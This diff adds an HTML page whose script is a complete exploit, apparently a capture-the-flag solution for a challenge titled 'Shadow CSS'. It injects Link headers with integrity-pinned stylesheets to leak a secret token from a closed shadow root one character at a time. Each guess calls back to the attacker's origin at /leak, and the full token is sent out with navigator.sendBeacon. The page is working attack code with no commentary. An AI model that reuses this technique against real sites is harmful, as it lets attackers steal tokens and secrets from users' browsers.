@@ -1,0 +1,79 @@
+<body>
+  <script
+    src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"
+    integrity="sha512-a+SUDuwNzXDvz4XrIcXHuCf089/iJAoN4lmrXJg18XnduKK6YlDHNRalv4yd1N40OKI80tFidF+rqTFKGPoWFQ=="
+    crossorigin="anonymous"
+    referrerpolicy="no-referrer"
+  ></script>
+
+  <script type="module">
+    const BASE_URL = "http://web:3000";
+    const CHARS = [..."0123456789abcdef"];
+
+    const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
+
+    const calcIntegrity = (data) =>
+      "sha256-" + CryptoJS.enc.Base64.stringify(CryptoJS.SHA256(data));
+
+    const getCss = (css, prefix) => {
+      return (
+        `
+<!DOCTYPE html>
+<html>
+  <head>
+    <style>{{CSS}}</style>
+  </head>
+  <body>
+    <h1>Shadow CSS 👤</h1>
+    <div>
+      <template shadowrootmode="closed">
+        <div data-token="
+        `
+          .trim()
+          .replace("{{CSS}}", css) + prefix
+      );
+    };
+
+    const win = open("");
+    await sleep(100);
+
+    const leak = async (known) => {
+      const links = [];
+      for (const c of CHARS) {
+        const prefix = known + c;
+
+        const innerCss = `{} h1 { background: url(${location.origin}/leak?prefix=${prefix}) }`;
+        const outerCss = getCss(innerCss, prefix);
+
+        const integrity = calcIntegrity(outerCss);
+        const link = `</?${new URLSearchParams({
+          css: innerCss,
+          k: "Content-Length",
+          v: new TextEncoder().encode(outerCss).length,
+        })}>; rel=stylesheet; integrity=${integrity}`;
+
+        links.push(link);
+      }
+
+      const url = `${BASE_URL}/?${new URLSearchParams({
+        k: "Link",
+        v: links.join(", "),
+      })}`;
+
+      win.location = url;
+
+      return await Promise.race([
+        fetch(`/known?length=${known.length + 1}`).then((r) => r.text()),
+        sleep(1000),
+      ]);
+    };
+
+    let known = "TOKEN_";
+    for (let i = 0; i < 12 * 2; i++) {
+      console.log({ known });
+      known = await leak(known);
+    }
+
+    navigator.sendBeacon("/token", known);
+  </script>
+</body>
